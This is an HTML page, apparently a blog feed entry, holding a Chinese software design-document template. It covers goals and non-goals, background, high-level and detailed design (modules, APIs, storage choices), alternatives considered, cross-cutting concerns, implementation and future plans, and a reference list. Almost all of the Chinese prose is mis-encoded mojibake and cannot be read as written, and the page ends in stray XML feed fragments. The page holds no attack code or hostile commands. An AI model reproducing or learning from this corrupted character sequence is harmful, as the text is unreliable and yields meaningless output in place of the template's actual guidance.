<h1 id="Design-Doc-Template"><a href="#Design-Doc-Template" class="headerlink" title="Design Doc Template"></a><strong>Design Doc Template</strong></h1><h2 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a><strong>ç›®æ ‡</strong></h2><p>â€œæˆ‘ä»¬è¦è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿâ€</p>
<p>ç”¨å‡ å¥è¯è¯´æ˜è¯¥è®¾è®¡æ–‡æ¡£çš„å…³é”®ç³»ç»Ÿç›®çš„ï¼Œè®©è¯»è€…èƒ½å¤Ÿä¸€çœ¼å¾—çŸ¥è‡ªå·±æ˜¯å¦å¯¹è¯¥è®¾è®¡æ–‡æ¡£æ„Ÿå…´è¶£ã€‚</p>
<p>å¦‚ï¼š</p>
<p>â€œæœ¬æ–‡æè¿° Spanner çš„é¡¶å±‚è®¾è®¡â€</p>
<p>ç»§è€Œï¼Œä½¿ç”¨ Bullet Points æè¿°è¯¥è®¾è®¡è¯•å›¾è¾¾åˆ°çš„é‡è¦ç›®æ ‡ï¼Œå¦‚ï¼š</p>
<ul>
<li>å¯æ‰©å±•æ€§</li>
<li>å¤šç‰ˆæœ¬</li>
<li>å…¨çƒåˆ†å¸ƒ</li>
<li>åŒæ­¥å¤åˆ¶</li>
</ul>
<p>éç›®æ ‡ä¹Ÿå¯èƒ½å¾ˆé‡è¦ã€‚</p>
<p>éç›®æ ‡å¹¶éå•çº¯ç›®æ ‡çš„å¦å®šå½¢å¼ï¼Œä¹Ÿä¸æ˜¯ä¸è§£å†³é—®é¢˜æ— å…³çš„å…¶å®ƒç›®æ ‡ï¼Œè€Œæ˜¯ä¸€äº›å¯èƒ½æ˜¯è¯»è€…éé¢„æœŸçš„ã€æœ¬å¯ä½œä¸ºç›®æ ‡ä½†å¹¶æ²¡æœ‰çš„ç›®æ ‡ï¼Œå¦‚ï¼š</p>
<ul>
<li>é«˜å¯ç”¨æ€§</li>
<li>é«˜å¯é æ€§</li>
</ul>
<p>å¦‚æœå¯èƒ½ï¼Œè§£é‡Šæ˜¯åŸºäºå“ªäº›æ–¹é¢çš„è€ƒè™‘å°†ä¹‹ä½œä¸ºéç›®æ ‡ã€‚å¦‚ï¼š</p>
<ul>
<li>å¯ç»´æŠ¤æ€§ï¼š æœ¬æœåŠ¡åªæ˜¯è¿‡æ¸¡æ–¹æ¡ˆï¼Œé¢„è®¡å¯¿å‘½ä¸‰ä¸ªæœˆï¼Œå¾… XX ä¸Šçº¿è¿è¡Œåå³å¯ä¸‹çº¿</li>
</ul>
<p>è®¾è®¡ä¸æ˜¯è¯•å›¾è¾¾åˆ°å®Œç¾ï¼Œè€Œæ˜¯è¯•å›¾è¾¾åˆ°å¹³è¡¡ã€‚ æ˜¾å¼åœ°å£°æ˜å“ªäº›æ˜¯æ˜¯ç›®æ ‡ï¼Œå“ªäº›æ˜¯éç›®æ ‡ï¼Œæœ‰åŠ©äºå¸®åŠ©è¯»è€…ç†è§£ä¸‹æ–‡ä¸­è®¾è®¡å†³ç­–çš„åˆç†æ€§ï¼ŒåŒæ—¶ä¹Ÿæœ‰åŠ©äºæ—¥åè¿­ä»£è®¾è®¡æ—¶ï¼Œæ£€æŸ¥æœ€åˆçš„å‡è®¾æ˜¯å¦ä»ç„¶æˆç«‹ã€‚</p>
<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a><strong>èƒŒæ™¯</strong></h2><p>â€œæˆ‘ä»¬ä¸ºä»€ä¹ˆè¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿâ€</p>
<p>ä¸ºè®¾è®¡æ–‡æ¡£çš„ç›®æ ‡è¯»è€…æä¾›ç†è§£è¯¦ç»†è®¾è®¡æ‰€éœ€çš„èƒŒæ™¯ä¿¡æ¯ã€‚</p>
<p>æŒ‰è¯»è€…èŒƒå›´æ¥æä¾›èƒŒæ™¯ã€‚è§ä¸Šæ–‡å…³äºç›®æ ‡è¯»è€…çš„åœˆå®šã€‚</p>
<p>è®¾è®¡æ–‡æ¡£åº”è¯¥æ˜¯æ˜¯â€œè‡ªè¶³çš„â€ï¼ˆself-containedï¼‰ï¼Œå³åº”è¯¥ä¸ºè¯»è€…æä¾›è¶³å¤Ÿçš„èƒŒæ™¯çŸ¥è¯†ï¼Œä½¿å…¶æ— éœ€è¿›ä¸€æ­¥çš„æŸ¥é˜…èµ„æ–™å³å¯ç†è§£åæ–‡çš„è®¾è®¡ã€‚</p>
<p>ä¿æŒç®€æ´ï¼Œé€šå¸¸ä»¥å‡ æ®µä¸ºå®œï¼Œæ¯æ®µç®€è¦ä»‹ç»å³å¯ã€‚å¦‚æœéœ€è¦å‘è¯»è€…æä¾›è¿›ä¸€æ­¥çš„ä¿¡æ¯ï¼Œæœ€å¥½åªæä¾›é“¾æ¥ã€‚</p>
<p>è­¦æƒ•çŸ¥è¯†çš„è¯…å’’ã€‚ <strong>çŸ¥è¯†çš„è¯…å’’</strong>ï¼ˆCurse of knowledgeï¼‰æ˜¯ä¸€ç§<a href="https://zh.wikipedia.org/wiki/%E8%AA%8D%E7%9F%A5%E5%81%8F%E5%B7%AE">è®¤çŸ¥åå·®</a>ï¼ŒæŒ‡äººåœ¨ä¸ä»–äººäº¤æµçš„æ—¶å€™ï¼Œä¸‹æ„è¯†åœ°å‡è®¾å¯¹æ–¹æ‹¥æœ‰ç†è§£æ‰€éœ€è¦çš„èƒŒæ™¯çŸ¥è¯†ã€‚</p>
<p>èƒŒæ™¯é€šå¸¸å¯ä»¥åŒ…æ‹¬ï¼š</p>
<ul>
<li><p>éœ€æ±‚åŠ¨æœºä»¥åŠå¯èƒ½çš„ä¾‹å­ã€‚ å¦‚ï¼Œâ€œï¼ˆtRPC) å¾®æœåŠ¡æ¨¡å¼æ­£åœ¨å…¬å¸å†…å˜å¾—æµè¡Œï¼Œä½†æ˜¯ç¼ºå°‘ä¸€ä¸ªé€šç”¨çš„ã€å°è£…äº†å¸¸ç”¨å†…éƒ¨å·¥å…·åŠæœåŠ¡æ¥å£çš„å¾®æœåŠ¡æ¡†æ¶â€ã€‚</p>
</li>
<li><ul>
<li>è¿™æ˜¯æ”¾ç½®éœ€æ±‚æ–‡æ¡£çš„é“¾æ¥çš„å¥½åœ°æ–¹ã€‚</li>
</ul>
</li>
<li><p>æ­¤å‰çš„ç‰ˆæœ¬ä»¥åŠå®ƒä»¬çš„é—®é¢˜ã€‚ å¦‚ï¼Œâ€œ(tRPC) Taf æ˜¯ä¹‹å‰çš„åº”ç”¨æ¡†æ¶ï¼Œ æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼Œâ€¦â€¦â€¦â€¦ï¼Œ ä½†æ˜¯æœ‰ä»¥ä¸‹å±€é™æ€§åŠå†å²é—ç•™é—®é¢˜â€ã€‚</p>
</li>
<li><p>å…¶å®ƒå·²æœ‰æ–¹æ¡ˆï¼Œ å¦‚å…¬å¸å†…å…¶å®ƒæ–¹æ¡ˆæˆ–å¼€æºæ–¹æ¡ˆï¼Œ â€œtRPC vs. gRPC vs. Stubbyâ€</p>
</li>
<li><p>ç›¸å…³çš„é¡¹ç›®ï¼Œå¦‚ â€œtRPC æ¡†æ¶ä¸­å¯èƒ½ä¼šå¯¹æ¥çš„å…¶å®ƒ PCG ç³»ç»Ÿâ€</p>
</li>
</ul>
<p>ä¸è¦åœ¨èƒŒæ™¯ä¸­å†™ä½ çš„è®¾è®¡ï¼Œæˆ–å¯¹é—®é¢˜çš„è§£å†³æ€è·¯ã€‚ </p>
<h2 id="æ€»ä½“è®¾è®¡"><a href="#æ€»ä½“è®¾è®¡" class="headerlink" title="æ€»ä½“è®¾è®¡"></a><strong>æ€»ä½“è®¾è®¡</strong></h2><p>â€œæˆ‘ä»¬å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿâ€</p>
<p>ç”¨ä¸€é¡µæè¿°é«˜å±‚è®¾è®¡ã€‚</p>
<p>è¯´æ˜ç³»ç»Ÿçš„ä¸»è¦ç»„æˆéƒ¨åˆ†ï¼Œä»¥åŠä¸€äº›å…³é”®è®¾è®¡å†³ç­–ã€‚è¯¥ç³»ç»Ÿåº”æœ‰å¯¹åº”çš„æ¨¡å—æˆ–åŠªåŠ›ä»¥æ»¡è¶³å‰é¢æ‰€åˆ—å‡ºçš„ç›®æ ‡ã€‚</p>
<p>æœ¬è®¾è®¡æ–‡æ¡£çš„è¯„å®¡äººåº”è¯¥èƒ½å¤Ÿæ ¹æ®è¯¥æ€»ä½“è®¾è®¡ç†è§£ä½ çš„è®¾è®¡æ€è·¯å¹¶åšå‡ºè¯„ä»·ã€‚</p>
<p>æè¿°åº”è¯¥å¯¹ä¸€ä¸ªæ–°çš„ã€ä¸åœ¨è¯¥é¡¹ç›®å·¥ä½œçš„è…¾è®¯å·¥ç¨‹å¸ˆè€Œè¨€æ˜¯å¯ä»¥ç†è§£çš„ã€‚</p>
<p>æ¨èä½¿ç”¨ <a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E5%85%B3%E7%B3%BB%E5%9B%BE">ç³»ç»Ÿå…³ç³»å›¾</a> æè¿°è®¾è®¡ã€‚å®ƒå¯ä»¥ä½¿è¯»è€…æ¸…æ™°åœ°äº†è§£æ–‡ä¸­çš„æ–°ç³»ç»Ÿå’Œå·²ç»ç†Ÿæ‚‰çš„ç³»ç»Ÿé—´çš„å…³ç³»ã€‚å®ƒä¹Ÿå¯ä»¥åŒ…å«æ–°ç³»ç»Ÿå†…éƒ¨æ¦‚è¦çš„ç»„æˆæ¨¡å—ã€‚</p>
<p>æ³¨æ„ï¼šä¸è¦åªæ”¾ä¸€ä¸ªå›¾è€Œä¸åšä»»ä½•è¯´æ˜ï¼Œè¯·æ ¹æ®ä¸Šé¢å°èŠ‚çš„è¦æ±‚ç”¨æ–‡å­—æè¿°è®¾è®¡æ€æƒ³ã€‚</p>
<p>â€‹        <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212114819.png" alt="img"></p>
<p>â€‹                 <img src="https://docimg1.docs.qq.com/image/A94XO50A_ONl4b8m_1iZug.png?w=640&h=325" alt="img">        </p>
<p>ä¸€ä¸ªç¤ºä¾‹ç³»ç»Ÿå…³ç³»å›¾</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212114561.png" alt="image-20211027153643534"></p>
<p>è‡ªä¸¾çš„æ–‡æ¡£ç»“æ„å›¾</p>
<p>â€‹                 <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212115526.png" alt="img">        </p>
<p>å¯èƒ½ä¸å¤ªå¥½çš„é¡¶å±‚è®¾è®¡</p>
<p>ä¸è¦åœ¨è¿™é‡Œæè¿°ç»†èŠ‚ï¼Œæ”¾åœ¨ä¸‹ä¸€ç« èŠ‚ä¸­ï¼› ä¸è¦åœ¨è¿™é‡Œæè¿°èƒŒæ™¯ï¼Œæ”¾åœ¨ä¸Šä¸€ç« èŠ‚ä¸­ã€‚</p>
<h2 id="è¯¦ç»†è®¾è®¡"><a href="#è¯¦ç»†è®¾è®¡" class="headerlink" title="è¯¦ç»†è®¾è®¡"></a><strong>è¯¦ç»†è®¾è®¡</strong></h2><p>åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œé™¤äº†ä»‹ç»è®¾è®¡æ–¹æ¡ˆçš„ç»†èŠ‚ï¼Œè¿˜åº”è¯¥åŒ…æ‹¬åœ¨äº§ç”Ÿæœ€ç»ˆæ–¹æ¡ˆè¿‡ç¨‹ä¸­ï¼Œä¸»è¦çš„è®¾è®¡æ€æƒ³åŠè€ƒè™‘è¿‡çš„æƒè¡¡ï¼ˆtradeoffï¼‰ã€‚è¿™ä¸€èŠ‚çš„ç»“æ„å’Œå†…å®¹å› è®¾è®¡å¯¹è±¡ï¼ˆç³»ç»Ÿï¼ŒAPIï¼Œæµç¨‹ç­‰ï¼‰çš„ä¸åŒå¯ä»¥è‡ªç”±å†³å®šï¼Œå¯ä»¥åˆ’åˆ†ä¸€äº›å°èŠ‚æ¥æ›´å¥½åœ°ç»„ç»‡å†…å®¹ï¼Œå°½å¯èƒ½ä»¥ç®€æ´æ˜äº†çš„ç»“æ„é˜æ˜æ•´ä¸ªè®¾è®¡ã€‚</p>
<p>ä¸è¦è¿‡å¤šå†™å®ç°ç»†èŠ‚ã€‚å°±åƒæˆ‘ä»¬ä¸æ¨èæ·»åŠ åªæ˜¯ä¸ºäº†è¯´æ˜ä»£ç åšäº†ä»€ä¹ˆçš„æ³¨é‡Šï¼Œæˆ‘ä»¬ä¹Ÿä¸æ¨èåœ¨è®¾è®¡æ–‡æ¡£ä¸­åªè¯´æ˜ä½ å…·ä½“è¦æ€ä¹ˆå®ç°è¯¥ç³»ç»Ÿã€‚å¦åˆ™ï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥å®ç°å‘¢ï¼Ÿ</p>
<p>ä»¥ä¸‹å†…å®¹å¯èƒ½æ˜¯å®ç°ç»†èŠ‚ä¾‹å­ï¼Œä¸é€‚åˆåœ¨è®¾è®¡æ–‡æ¡£ä¸­è®¨è®ºï¼š</p>
<ul>
<li>API çš„æ‰€æœ‰ç»†èŠ‚</li>
<li>å­˜å‚¨ç³»ç»Ÿçš„ Data Schema</li>
<li>å…·ä½“ä»£ç æˆ–ä¼ªä»£ç </li>
<li>è¯¥ç³»ç»Ÿå„æ¨¡å—ä»£ç çš„å­˜æ”¾ä½ç½®ã€å„æ¨¡å—ä»£ç çš„å¸ƒå±€</li>
<li>è¯¥ç³»ç»Ÿä½¿ç”¨çš„ç¼–è¯‘å™¨ç‰ˆæœ¬</li>
<li>å¼€å‘è§„èŒƒ</li>
</ul>
<p>é€šå¸¸å¯ä»¥åŒ…å«ä»¥ä¸‹å†…å®¹ï¼ˆæ³¨æ„ï¼Œå°èŠ‚çš„å‘½åå¯ä»¥æ›´æ”¹ä¸ºæ›´æ¸…æ™°ä½“ç°å†…å®¹çš„æ ‡é¢˜ï¼‰ï¼š</p>
<h3 id="å„å­æ¨¡å—çš„è®¾è®¡"><a href="#å„å­æ¨¡å—çš„è®¾è®¡" class="headerlink" title="å„å­æ¨¡å—çš„è®¾è®¡"></a><strong>å„å­æ¨¡å—çš„è®¾è®¡</strong></h3><p>é˜æ˜ä¸€äº›å¤æ‚æ¨¡å—å†…éƒ¨çš„ç»†èŠ‚ï¼Œå¯ä»¥åŒ…å«ä¸€äº›æ¨¡å—å›¾ã€æµç¨‹å›¾æ¥å¸®åŠ©è¯»è€…ç†è§£ã€‚å¯ä»¥å€ŸåŠ©æ—¶åºå›¾è¿›è¡Œå±•ç°ï¼Œå¦‚ä¸€æ¬¡è°ƒç”¨åœ¨å„å­æ¨¡å—ä¸­çš„è¿è¡Œè¿‡ç¨‹ã€‚</p>
<p>æ¯ä¸ªå­æ¨¡å—éœ€è¦è¯´æ˜è‡ªå·±å­˜åœ¨çš„æ„ä¹‰ã€‚å¦‚æ— å¿…è¦ï¼Œå‹¿æ·»æ¨¡å—ã€‚</p>
<p>å¦‚æœæ²¡æœ‰ç‰¹æ®Šæƒ…å†µï¼ˆä¾‹å¦‚è¯¥è®¾è®¡æ–‡æ¡£æ˜¯ä¸ºäº†æè¿°å¹¶å®ç°ä¸€ä¸ªæ ¸å¿ƒç®—æ³•ï¼‰ï¼Œä¸è¦åœ¨ç³»ç»Ÿè®¾è®¡åŠ å…¥ä»£ç æˆ–è€…ä¼ªä»£ç ã€‚</p>
<h3 id="APIæ¥å£"><a href="#APIæ¥å£" class="headerlink" title="APIæ¥å£"></a><strong>APIæ¥å£</strong></h3><p>å¦‚æœè®¾è®¡çš„ç³»ç»Ÿä¼šæš´éœ² API æ¥å£ï¼Œé‚£ä¹ˆç®€è¦åœ°æè¿°ä¸€ä¸‹APIä¼šå¸®åŠ©ç†è§£ç³»ç»Ÿçš„è¾¹ç•Œã€‚</p>
<p>é¿å…å°†æ•´ä¸ªæ¥å£å¤åˆ¶ç²˜è´´åˆ°æ–‡æ¡£ä¸­ï¼Œå› ä¸ºåœ¨ç‰¹å®šç¼–ç¨‹è¯­è¨€ä¸­çš„æ¥å£é€šå¸¸åŒ…å«ä¸€äº›è¯­è¨€ç»†èŠ‚è€Œæ˜¾å¾—å†—é•¿ï¼Œå¹¶ä¸”æœ‰ä¸€äº›ç»†èŠ‚ä¹Ÿä¼šå¾ˆå¿«å˜åŒ–ã€‚ç€é‡è¡¨ç°APIæ¥å£è·Ÿè®¾è®¡æœ€ç›¸å…³çš„ä¸»è¦éƒ¨åˆ†å³å¯ã€‚</p>
<h3 id="å­˜å‚¨"><a href="#å­˜å‚¨" class="headerlink" title="å­˜å‚¨"></a><strong>å­˜å‚¨</strong></h3><p>ä»‹ç»ç³»ç»Ÿä¾èµ–çš„å­˜å‚¨è®¾è®¡ã€‚è¯¥éƒ¨åˆ†å†…å®¹åº”è¯¥å›ç­”ä»¥ä¸‹é—®é¢˜ï¼Œå¦‚æœç­”æ¡ˆå¹¶éæ˜¾è€Œæ˜“è§ï¼š</p>
<ul>
<li><p>è¯¥ç³»ç»Ÿå¯¹æ•°æ®&#x2F;å­˜å‚¨æœ‰å“ªäº›è¦æ±‚ï¼Ÿ </p>
</li>
<li><ul>
<li>è¯¥ç³»ç»Ÿä¼šå¦‚ä½•ä½¿ç”¨æ•°æ®ï¼Ÿ</li>
<li>æ•°æ®æ˜¯ä»€ä¹ˆç±»å‹çš„ï¼Ÿ</li>
<li>æ•°æ®è§„æ¨¡æœ‰å¤šå¤§ï¼Ÿ</li>
<li>è¯»å†™æ¯”æ˜¯å¤šå°‘ï¼Ÿè¯»å†™é¢‘ç‡æœ‰å¤šé«˜ï¼Ÿ</li>
<li>å¯¹å¯æ‰©å±•æ€§æ˜¯å¦æœ‰è¦æ±‚ï¼Ÿ</li>
<li>å¯¹åŸå­æ€§è¦æ±‚æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>å¯¹ä¸€è‡´æ€§è¦æ±‚æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯å¦éœ€è¦æ”¯æŒäº‹åŠ¡ï¼Ÿ</li>
<li>å¯¹å¯ç”¨æ€§è¦æ±‚æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>å¯¹æ€§èƒ½çš„è¦æ±‚æ˜¯ä»€ä¹ˆï¼Ÿ</li>
<li>â€¦â€¦â€¦â€¦</li>
</ul>
</li>
<li><p>åŸºäºä¸Šé¢çš„äº‹å®ï¼Œæ•°æ®åº“åº”è¯¥å¦‚ä½•é€‰å‹ï¼Ÿ</p>
</li>
<li><ul>
<li>é€‰ç”¨å…³ç³»å‹æ•°æ®åº“è¿˜æ˜¯éå…³ç³»å‹æ•°æ®åº“ï¼Ÿæ˜¯å¦æœ‰åˆé€‚çš„ä¸­é—´ä»¶å¯ä»¥ä½¿ç”¨ï¼Ÿ</li>
<li>å¦‚ä½•åˆ†ç‰‡ï¼Ÿæ˜¯å¦éœ€è¦åˆ†åº“åˆ†è¡¨ï¼Ÿæ˜¯å¦éœ€è¦å‰¯æœ¬ï¼Ÿ</li>
<li>æ˜¯å¦éœ€è¦å¼‚åœ°å®¹ç¾ï¼Ÿ</li>
<li>æ˜¯å¦éœ€è¦å†·çƒ­åˆ†ç¦»ï¼Ÿ</li>
<li>â€¦â€¦â€¦â€¦</li>
</ul>
</li>
</ul>
<p>å¦‚æœæ˜¯å…³ç³»å‹æ•°æ®ï¼Œå¯ä»¥å€ŸåŠ©<a href="https://zh.wikipedia.org/wiki/ER%E6%A8%A1%E5%9E%8B">ERå›¾</a>çš„æ–¹å¼å±•ç°æ•°æ®é—´çš„å…³ç³»ã€‚</p>
<p>å›ç­”ä¸Šè¿°é—®é¢˜æ—¶ï¼Œå°½å¯èƒ½æä¾›æ•°æ®ï¼Œå°†æ•°æ®ä½œä¸ºç­”æ¡ˆæˆ–ä½œä¸ºè¾…åŠ©ã€‚ ä¸è¦å›ç­”â€œæ•°æ®è§„æ¨¡å¾ˆå¤§ï¼Œè¯»å†™é¢‘ç¹â€ï¼Œè€Œæ˜¯å›ç­”â€œé¢„è®¡æ•°æ®è§„æ¨¡ä¸º 300Tï¼Œ 3M æ—¥è¯»å‡ºï¼Œ 0.3M æ—¥å†™å…¥ï¼Œ å·…å³° QPS ä¸º 300â€ã€‚è¿™æ ·æ‰èƒ½ä¸ºä¸‹ä¸€æ­¥çš„å…·ä½“æ•°æ®åº“é€ å‹æä¾›è¯¦ç»†çš„å†³ç­–ä¾æ®ï¼Œå¹¶è®©è¯»è€…ä¿¡æœã€‚</p>
<p>æ³¨æ„ï¼šåœ¨é€ å‹æ—¶ä¹Ÿè¦åŒ…æ‹¬å¯èƒ½ä¼šé€ æˆæ˜¾è‘—å½±å“çš„éæŠ€æœ¯å› ç´ ï¼Œå¦‚è´¹ç”¨ã€‚</p>
<p>é¿å…å°†æ‰€æœ‰æ•°æ®å®šä¹‰ï¼ˆdata schemaï¼‰å¤åˆ¶ç²˜è´´åˆ°æ–‡æ¡£ä¸­ï¼Œå› ä¸º data schema æ›´åå®ç°ç»†èŠ‚ã€‚</p>
<h2 id="å…¶ä»–æ–¹æ¡ˆ"><a href="#å…¶ä»–æ–¹æ¡ˆ" class="headerlink" title="å…¶ä»–æ–¹æ¡ˆ"></a><strong>å…¶ä»–æ–¹æ¡ˆ</strong></h2><p>â€œæˆ‘ä»¬ä¸ºä»€ä¹ˆä¸è¿™ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿâ€</p>
<p>åœ¨ä»‹ç»äº†æœ€ç»ˆæ–¹æ¡ˆåï¼Œå¯ä»¥æœ‰ä¸€èŠ‚ä»‹ç»ä¸€ä¸‹è®¾è®¡è¿‡ç¨‹ä¸­è€ƒè™‘è¿‡çš„å…¶ä»–è®¾è®¡æ–¹æ¡ˆï¼ˆAlternatives Consideredï¼‰ã€å®ƒä»¬å„è‡ªçš„ä¼˜ç¼ºç‚¹å’Œæƒè¡¡ç‚¹ã€ä»¥åŠå¯¼è‡´é€‰æ‹©æœ€ç»ˆæ–¹æ¡ˆçš„åŸå› ç­‰ã€‚é€šå¸¸ï¼Œæœ‰ç»éªŒçš„è¯»è€…ï¼ˆå°¤å…¶æ˜¯æ–¹æ¡ˆçš„å®¡é˜…è€…ï¼‰ä¼šå¾ˆè‡ªç„¶åœ°æƒ³åˆ°ä¸€äº›å…¶ä»–è®¾è®¡æ–¹æ¡ˆï¼Œå¦‚æœè¿™é‡Œçš„ä»‹ç»æè¿°äº†æ²¡æœ‰é€‰æ‹©è¿™äº›æ–¹æ¡ˆçš„åŸå› ï¼Œå°±é¿å…è¯»è€…å¸¦ç€ç–‘é—®çœ‹å®Œæ•´ä¸ªè®¾è®¡å†æ¥è¯¢é—®ä½œè€…ã€‚è¿™ä¸€èŠ‚å¯ä»¥ä½“ç°è®¾è®¡çš„ä¸¥è°¨æ€§å’Œå…¨é¢æ€§ã€‚</p>
<h2 id="äº¤å‰å…³æ³¨ç‚¹"><a href="#äº¤å‰å…³æ³¨ç‚¹" class="headerlink" title="äº¤å‰å…³æ³¨ç‚¹"></a><strong>äº¤å‰å…³æ³¨ç‚¹</strong></h2><h3 id="åŸºç¡€è®¾æ–½"><a href="#åŸºç¡€è®¾æ–½" class="headerlink" title="åŸºç¡€è®¾æ–½"></a><strong>åŸºç¡€è®¾æ–½</strong></h3><h3 id="å®‰å…¨"><a href="#å®‰å…¨" class="headerlink" title="å®‰å…¨"></a><strong>å®‰å…¨</strong></h3><h3 id="éšç§"><a href="#éšç§" class="headerlink" title="éšç§"></a><strong>éšç§</strong></h3><h3 id="å»¶è¿Ÿ"><a href="#å»¶è¿Ÿ" class="headerlink" title="å»¶è¿Ÿ"></a><strong>å»¶è¿Ÿ</strong></h3><h3 id="å†—ä½™-amp-å¯é æ€§"><a href="#å†—ä½™-amp-å¯é æ€§" class="headerlink" title="å†—ä½™ &amp; å¯é æ€§"></a><strong>å†—ä½™ &amp; å¯é æ€§</strong></h3><p>æ˜¯å¦éœ€è¦å®¹ç¾ï¼Ÿæ˜¯å¦éœ€è¦è¿‡è½½ä¿æŠ¤ã€æœ‰æŸé™çº§ã€æ¥å£ç†”æ–­ã€è½»é‡åˆ†ç¦»ï¼Ÿ</p>
<h3 id="æ•°æ®å®Œæ•´æ€§"><a href="#æ•°æ®å®Œæ•´æ€§" class="headerlink" title="æ•°æ®å®Œæ•´æ€§"></a><strong>æ•°æ®å®Œæ•´æ€§</strong></h3><h2 id="å®ç°è®¡åˆ’"><a href="#å®ç°è®¡åˆ’" class="headerlink" title="å®ç°è®¡åˆ’"></a><strong>å®ç°è®¡åˆ’</strong></h2><p>æè¿°æ—¶é—´åŠäººåŠ›å®‰æ’ï¼Œå¦‚é‡Œç¨‹ç¢‘ã€‚ è¿™åˆ©äºç›¸å…³äººå‘˜äº†è§£é¢„æœŸï¼Œè°ƒæ•´å·¥ä½œè®¡åˆ’ã€‚</p>
<h2 id="æœªæ¥è®¡åˆ’"><a href="#æœªæ¥è®¡åˆ’" class="headerlink" title="æœªæ¥è®¡åˆ’"></a><strong>æœªæ¥è®¡åˆ’</strong></h2><p>æœªæ¥å¯èƒ½çš„è®¡åˆ’ä¼šæ–¹ä¾¿è¯»è€…æ›´å¥½åœ°ç†è§£è¯¥è®¾è®¡ä»¥åŠå…¶å®šä½ã€‚</p>
<p>æˆ‘ä»¬ç¡®å®åº”è¯¥æŠŠè®¾è®¡é™å®šåœ¨å½“å‰é—®é¢˜ï¼Œä½†æ˜¯è¯¥è®¾è®¡å¯èƒ½æ˜¯æ›´é«˜å±‚ç³»ç»Ÿæ‰€è¦è§£å†³é—®é¢˜çš„ä¸€éƒ¨åˆ†ï¼Œæˆ–è€…åªæ˜¯é˜¶æ®µæ€§æ–¹æ¡ˆã€‚ è¯»è€…å¯èƒ½ä¼šå¯¹æ–¹æ¡ˆçš„å®Œæ•´æ€§æœ‰æ‰€ç–‘é—®ï¼Œä¼šè´¨ç–‘åˆ°åº•é—®é¢˜æ˜¯å¦å¾—åˆ°å®Œæ•´è§£å†³ï¼Œç”šè‡³ä¼šè´¨ç–‘è¯¥é—®é¢˜åœ¨æ›´é«˜å±‚çš„ç³»ç»Ÿä¸­æ˜¯å¦ç¡®å®å€¼å¾—è§£å†³ã€‚ â€œèƒŒæ™¯ï¼ˆè¿‡å»ï¼‰â€“ å½“å‰æ–¹æ¡ˆ â€“ æœªæ¥è®¡åˆ’â€ ä¸‰è€…çš„ç»“åˆä¼šä¸ºè¯»è€…æä¾›æ›´å¥½çš„å…¨æ™¯å›¾ã€‚</p>
<h1 id="é™„å½•ï¼š-å‚è€ƒæ–‡çŒ®"><a href="#é™„å½•ï¼š-å‚è€ƒæ–‡çŒ®" class="headerlink" title="é™„å½•ï¼š å‚è€ƒæ–‡çŒ®"></a><strong>é™„å½•ï¼š å‚è€ƒæ–‡çŒ®</strong></h1><p>å‚è€ƒæ–‡æ¡£ï¼š</p>
<ul>
<li><a href="https://km.woa.com/group/40176/articles/show/440739?from=iSearch">å¦‚ä½•ç¼–å†™è½¯ä»¶å·¥ç¨‹è®¾è®¡æ–‡æ¡£</a> </li>
<li><a href="https://www.industrialempathy.com/posts/design-docs-at-google/">Design Docs at Google</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFNzc05YelNhZldx">æ¨¡æ¿] è®¾è®¡æ–‡æ¡£æ¨¡æ¿</a></li>
<li>[<a href="https://docs.qq.com/doc/DUWlxc1pmdllZeEtL">ç¤ºä¾‹] è§†é¢‘å…³ç³»ç½‘ç»œå·¥ç¨‹è®¾è®¡æ–‡æ¡£</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFduSnV4RmhIZHB5">ç¤ºä¾‹] è§†é¢‘åå°ç»„ä»¶å¹³å°-æ€»ä½“è®¾è®¡</a></li>
<li>[<a href="https://docs.qq.com/doc/DUFRjTlJiamhXT3lD">ç¤ºä¾‹] Unionplus K-Listå­˜å‚¨è®¾è®¡æ›¿ä»£æ–¹æ¡ˆ</a></li>
<li><a href="https://docs.qq.com/doc/DUFRjTlJiamhXT3lD">Unionplus K-Listå­˜å‚¨è®¾è®¡æ›¿ä»£æ–¹æ¡ˆ</a><a href="https://www.chromium.org/developers/design-documents">chromium è®¾è®¡æ–‡æ¡£å®ä¾‹</a></li>
</ul>
<p>å‚è€ƒä¹¦ç±ï¼š</p>
<ul>
<li><a href="https://book.douban.com/subject/20062380/">Style</a>, <em>Joseph M. Williams &#x2F; Joseph Bizup</em></li>
<li><a href="https://book.douban.com/subject/1020644/">é‡‘å­—å¡”åŸç† : æ€è€ƒã€å†™ä½œå’Œè§£å†³é—®é¢˜çš„é€»è¾‘</a>, <em>å·´å·´æ‹‰Â·æ˜æ‰˜</em></li>
<li><a href="https://book.douban.com/subject/3888123/">å†™ä½œè¿™å›äº‹</a>ï¼Œ<em>æ–¯è’‚èŠ¬Â·é‡‘</em></li>
<li><a href="https://book.douban.com/subject/1433835/">The elements of style,</a> <em>William Strunk Jr. &#x2F; E. B. White</em></li>
<li><a href="https://www.goodreads.com/en/book/show/44144493-fundamentals-of-software-architecture">Fundamentals of Software Architecture</a>, <em>Mark Richards &#x2F; Neal Ford</em></li>
<li><a href="https://book.douban.com/subject/34875994/">Software engineering at Google</a>, <em>Titus Winters &#x2F; Tom Manshreck &#x2F; Hyrum K. Wright</em></li>
<li><a href="https://book.douban.com/subject/35143751/">å†™ä½œæ˜¯é—¨æ‰‹è‰º</a>ï¼Œ<em>åˆ˜å†›å¼º</em></li>
</ul>
]]></content>
      <categories>
        <category>è®¾è®¡æ–‡æ¡£</category>
